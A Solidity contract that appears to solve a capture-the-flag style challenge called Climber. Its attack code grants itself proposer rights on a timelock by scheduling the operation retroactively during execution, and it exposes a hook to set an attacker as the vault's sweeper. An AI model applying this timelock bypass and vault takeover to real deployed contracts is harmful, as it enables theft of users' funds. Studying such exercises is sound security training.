pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";
import "../climber/ClimberTimelock.sol";

contract ClimberExploit is ClimberVault {
	ClimberTimelock timelock;

	constructor(address payable _timelock) {
		timelock = ClimberTimelock(_timelock);
	}

	// Interface function as _setSweeper cannot be called directly (internal function)
	function setSweeper(address _attacker) external {
		_setSweeper(_attacker);
	}

	// This function validate the call to 'grantRole' and itself by scheduling the operation retrospectively (i.e. during the actual 'execute' call)
	function scheduleProposerRole() external {
		address[] memory targets = new address[](2);
		uint256[] memory values = new uint256[](2);
		bytes[] memory data = new bytes[](2);

		targets[0] = address(timelock);
		targets[1] = address(this);
		values[0] = 0;
		values[1] = 0;
		data[0] = abi.encodeWithSignature("grantRole(bytes32,address)", timelock.PROPOSER_ROLE(), address(this));
		data[1] = abi.encodeWithSignature("scheduleProposerRole()");

		timelock.schedule(targets, values, data, bytes32(0));
	}

	function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements) external {
		timelock.schedule(targets, values, dataElements, bytes32(0));
	}
}
